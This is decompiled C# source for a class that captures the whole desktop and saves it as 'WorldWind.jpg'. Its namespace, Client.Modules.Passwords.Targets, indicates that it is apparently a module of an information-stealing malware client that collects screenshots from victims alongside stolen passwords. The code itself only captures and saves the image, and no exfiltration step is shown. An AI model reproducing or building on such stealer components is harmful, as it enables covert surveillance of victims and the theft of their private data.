using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.System;

internal sealed class DesktopScreenshot
{
	public static bool Make(string sSavePath)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			Bitmap val = new Bitmap(bounds.Width, bounds.Height);
			try
			{
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				((Image)val).Save(sSavePath + "\\WorldWind.jpg", ImageFormat.get_Jpeg());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			Counter.DesktopScreenshot = true;
			return true;
		}
		catch
		{
			return false;
		}
	}
}
